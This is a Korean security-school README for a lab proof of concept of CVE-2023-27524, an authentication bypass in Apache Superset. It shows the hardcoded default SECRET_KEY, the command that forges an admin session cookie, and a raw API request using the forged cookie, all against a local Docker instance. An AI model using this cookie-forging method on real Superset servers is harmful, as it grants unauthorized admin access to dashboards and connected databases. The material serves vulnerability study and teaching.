# CVE-2023-27524 - Apache Superset Authentication Bypass

> 화이트햇 스쿨 3기 (13반) - [박세민 (@8sheeta8)](https://github.com/8sheeta8) 


## 개요


Apache Superset은 데이터 탐색과 시각화를 위한 오픈소스 플랫폼입니다.
Superset은 기본 설정으로 하드코딩된 SECRET_KEY 값을 사용합니다.
관리자가 이 값을 변경하지 않으면, 공격자가 이를 이용해 세션 쿠키를 위조하고 관리자로 로그인할 수 있습니다.
이를 통해 Superset 대시보드, 연결된 데이터베이스에 무단 접근이 가능하며, 추가 취약점과 연계할 경우 원격 코드 실행(RCE)까지 이어질 수 있습니다.

취약 버전: Superset <= 2.0.1
취약점 유형: 인증 우회 (Authentication Bypass)

참고:
- <https://www.horizon3.ai/attack-research/disclosures/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/>
- <https://github.com/horizon3ai/CVE-2023-27524>

  
## PoC GitHub


### 1. Docker를 이용한 취약 환경 구축

```
docker compose up -d
```

Superset 서버가 http://localhost:8088 에서 구동됩니다.


### 2. 의존성 설치

```
# PoC 코드에 필요한 패키지를 설치합니다.

pip install -r requirements.txt
```

### 3. Forged Session 쿠키 생성

```
# PoC 코드를 실행하여 관리자 계정(user_id=1) 세션을 위조합니다.

python CVE-2023-27524.py --url http://localhost:8088 --id 1 --validate
```

실행 결과
기본 SECRET_KEY 사용 (CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET) 확인

forged session 생성 완료
302 리다이렉션 발생 → 인증 우회 성공 판정

<img width="1280" alt="제목 없음" src="https://github.com/user-attachments/assets/136e9b98-eb68-4ccc-a959-a0b914f95bf7" />

### 4. 인증 우회하여 백엔드 접근

```
# BurpSuite를 통해 forged session으로 API 호출

GET /api/v1/database/ HTTP/1.1
Host: localhost:8088
Cookie: session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.aA4W5Q.ni44K6wlFydKq4jwQZ0k3JcC6T0
```

정상적으로 200 OK 응답 수신
데이터베이스 리스트 열람 가능

![스크린샷 2025-04-27 205322](https://github.com/user-attachments/assets/3253505d-8ded-49b9-91f0-c0b05751c396)
